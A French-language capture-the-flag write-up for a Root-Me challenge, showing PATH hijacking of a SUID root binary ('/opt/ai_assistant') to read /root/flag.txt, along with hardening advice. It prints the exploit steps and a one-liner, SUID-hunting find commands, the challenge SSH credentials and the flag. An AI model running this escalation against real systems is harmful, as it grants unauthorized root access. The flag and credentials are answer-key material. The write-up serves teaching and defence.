# Linux Privesc - SUID Bit (Root-Me Challenge)

## Informations de connexion

```
Host: sockets.challenges.root-me.pro
Port: 32914
Utilisateur: user
Mot de passe: password
```

### Commande de connexion SSH

```bash
ssh user@sockets.challenges.root-me.pro -p 32914
```

---

## Objectif

Un assistant IA a été installé sur le serveur à `/opt/ai_assistant`. Le flag est situé dans `/root/flag.txt` et ressemble à `RM{...}`.

---

## Reconnaissance

### Analyse du binaire

```bash
user@challenge:~$ ls -la /opt/ai_assistant
-rwsr-xr-x 1 root root 16120 Jul 13  2025 /opt/ai_assistant
```

### Explication des permissions

```
-rwsr-xr-x
 │││││││││
 ││││││││└── Autres: exécution (x)
 │││││││└─── Autres: lecture (r)
 ││││││└──── Autres: pas d'écriture (-)
 │││││└───── Groupe: exécution (x)
 ││││└────── Groupe: lecture (r)
 │││└─────── Groupe: pas d'écriture (-)
 ││└──────── Propriétaire: exécution avec SUID (s) ← IMPORTANT!
 │└───────── Propriétaire: écriture (w)
 └────────── Propriétaire: lecture (r)
```

**Le bit SUID (`s`)** : Le programme s'exécute avec les privilèges du propriétaire (root), peu importe qui le lance.

### Exécution du programme

```bash
user@challenge:~$ /opt/ai_assistant
Hello, I'm your new AI assistant.
Let me check who am I...
root
```

Le programme affiche "root" car il s'exécute avec les privilèges root grâce au SUID bit.

### Analyse avec strings

```bash
user@challenge:~$ strings /opt/ai_assistant
/lib64/ld-linux-x86-64.so.2
puts
setgid
setuid
__libc_start_main
execv
__cxa_finalize
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
...
Hello, I'm your new AI assistant.
Let me check who am I...
/bin/sh
whoami                          ← VULNÉRABILITÉ ICI!
I'll be ready in a few years. Can you wait a little??
...
```

### Vulnérabilité identifiée

Le programme appelle `whoami` **sans chemin absolu** :
- ❌ `whoami` (vulnérable)
- ✅ `/usr/bin/whoami` (sécurisé)

Cela permet une attaque de type **PATH Hijacking**.

---

## Exploitation : PATH Hijacking

### Concept

Quand un programme exécute une commande sans chemin absolu, le système recherche cette commande dans les répertoires listés dans la variable `PATH`, dans l'ordre.

```bash
user@challenge:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Si on ajoute un répertoire au début du PATH contenant un faux `whoami`, notre version sera exécutée à la place de la vraie.

### Étapes de l'exploitation

#### 1. Créer un faux "whoami"

```bash
user@challenge:~$ echo "cat /root/flag.txt" > /tmp/whoami
```

Ce script affichera le contenu du flag quand il sera exécuté.

#### 2. Rendre le script exécutable

```bash
user@challenge:~$ chmod +x /tmp/whoami
```

#### 3. Modifier le PATH

```bash
user@challenge:~$ export PATH=/tmp:$PATH
user@challenge:~$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Maintenant `/tmp` est en premier dans le PATH.

#### 4. Exécuter le binaire SUID

```bash
user@challenge:~$ /opt/ai_assistant
Hello, I'm your new AI assistant.
Let me check who am I...
RM{df3f5388555af4d7df702a15e18755c6}
```

### Exploit en une ligne

```bash
echo "cat /root/flag.txt" > /tmp/whoami && chmod +x /tmp/whoami && PATH=/tmp:$PATH /opt/ai_assistant
```

---

## Schéma de l'attaque

```
┌─────────────────────────────────────────────────────────────┐
│                    AVANT L'ATTAQUE                          │
├─────────────────────────────────────────────────────────────┤
│  /opt/ai_assistant (SUID root)                              │
│         │                                                   │
│         ▼                                                   │
│  execv("whoami")                                            │
│         │                                                   │
│         ▼                                                   │
│  PATH: /usr/local/bin:/usr/bin:/bin:...                     │
│         │                                                   │
│         ▼                                                   │
│  /usr/bin/whoami → affiche "root"                           │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                    APRÈS L'ATTAQUE                          │
├─────────────────────────────────────────────────────────────┤
│  /opt/ai_assistant (SUID root)                              │
│         │                                                   │
│         ▼                                                   │
│  execv("whoami")                                            │
│         │                                                   │
│         ▼                                                   │
│  PATH: /tmp:/usr/local/bin:/usr/bin:/bin:...                │
│         │                                                   │
│         ▼                                                   │
│  /tmp/whoami → exécute "cat /root/flag.txt" EN TANT QUE ROOT│
│         │                                                   │
│         ▼                                                   │
│  Affiche: RM{df3f5388555af4d7df702a15e18755c6}              │
└─────────────────────────────────────────────────────────────┘
```

---

## Flag

```
RM{df3f5388555af4d7df702a15e18755c6}
```

---

## Concepts de sécurité

### Le bit SUID

| Permission | Valeur octale | Description |
|------------|---------------|-------------|
| SUID | 4000 | Le programme s'exécute avec les droits du propriétaire |
| SGID | 2000 | Le programme s'exécute avec les droits du groupe |
| Sticky | 1000 | Seul le propriétaire peut supprimer ses fichiers (utilisé sur /tmp) |

### Trouver les binaires SUID sur un système

```bash
# Trouver tous les fichiers avec SUID bit
find / -perm -4000 -type f 2>/dev/null

# Trouver les fichiers SUID appartenant à root
find / -perm -4000 -user root -type f 2>/dev/null
```

### Comment sécuriser un binaire SUID

1. **Utiliser des chemins absolus** pour toutes les commandes externes :
   ```c
   // Vulnérable
   execv("/bin/sh", (char*[]){"sh", "-c", "whoami", NULL});

   // Sécurisé
   execv("/bin/sh", (char*[]){"sh", "-c", "/usr/bin/whoami", NULL});
   ```

2. **Réinitialiser les variables d'environnement** sensibles :
   ```c
   // Vider PATH et définir un PATH sûr
   clearenv();
   setenv("PATH", "/usr/bin:/bin", 1);
   ```

3. **Utiliser `execve()` avec un environnement contrôlé** au lieu de `system()` ou `execv()`

---

## Commandes utiles

```bash
# Lister les permissions d'un fichier
ls -la /chemin/fichier

# Analyser les chaînes d'un binaire
strings /chemin/binaire

# Trouver les SUID
find / -perm -4000 2>/dev/null

# Modifier le PATH temporairement
export PATH=/tmp:$PATH

# Ou pour une seule commande
PATH=/tmp:$PATH /opt/ai_assistant
```

---

## Ressources

- [GTFOBins](https://gtfobins.github.io/) - Liste des binaires exploitables
- [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- `man chmod` - Documentation sur les permissions
